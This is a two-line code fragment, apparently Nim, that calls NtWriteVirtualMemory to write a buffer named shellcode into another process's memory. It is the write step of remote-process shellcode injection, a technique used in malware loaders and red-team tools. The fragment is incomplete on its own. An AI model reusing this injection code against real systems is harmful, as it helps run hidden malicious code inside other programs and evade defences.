var bytesWritten: SIZE_T
NtWriteVirtualMemory(pHandle, rPtr, unsafeAddr shellcode, sc_size-1, addr bytesWritten)
